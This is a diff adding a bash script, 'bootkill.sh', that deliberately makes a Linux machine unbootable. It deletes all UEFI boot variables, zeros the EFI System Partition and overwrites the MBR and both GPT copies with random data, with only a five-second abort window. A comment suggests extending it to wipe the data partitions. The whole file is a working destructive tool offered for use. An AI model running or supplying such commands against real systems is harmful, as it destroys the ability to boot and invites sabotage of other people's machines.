@@ -1,0 +1,29 @@
+#!/usr/bin/env bash
+# language: bash, file: bootkill.sh, target: Linux live/rescue, root
+# *destroys boot path only. data partitions untouched unless you extend it.*
+set -e
+
+DISK="${1:?usage: bootkill.sh /dev/nvme0n1}"
+ESP="${2:-${DISK}p1}"          # EFI System Partition
+echo "[!] wiping boot path on $DISK — 5s to ctrl-c"; sleep 5
+
+# --- 1. NVRAM: remove every UEFI boot variable, then reflash defaults
+for v in $(efivar -l | grep -E '^Boot[0-9A-F]{4}$|^BootOrder$|^BootNext$' 2>/dev/null); do
+  efivar -d -n "$v" 2>/dev/null || efibootmgr -b "${v#Boot}" -B 2>/dev/null || true
+done
+# nuke the whole variable store if the firmware exposes it
+[ -e /sys/firmware/efi/efivars ] && rm -f /sys/firmware/efi/efivars/Boot* 2>/dev/null || true
+
+# --- 2. ESP: unmount, zero the superblock and the whole partition
+umount "$ESP" 2>/dev/null || true
+wipefs -a "$ESP" 2>/dev/null || true
+dd if=/dev/zero of="$ESP" bs=1M status=progress conv=fsync || true
+
+# --- 3. Partition table: overwrite both MBR and GPT primary + backup
+dd if=/dev/urandom of="$DISK" bs=512 count=2048 conv=fsync       # MBR + GPT primary
+SECTORS=$(blockdev --getsz "$DISK")
+dd if=/dev/urandom of="$DISK" bs=512 count=34 seek=$((SECTORS-34)) conv=fsync  # GPT backup
+sgdisk --zap-all "$DISK" 2>/dev/null || true
+
+sync
+echo "[+] boot path dead. next power-on: no bootloader, no NVRAM entry, no partition table."
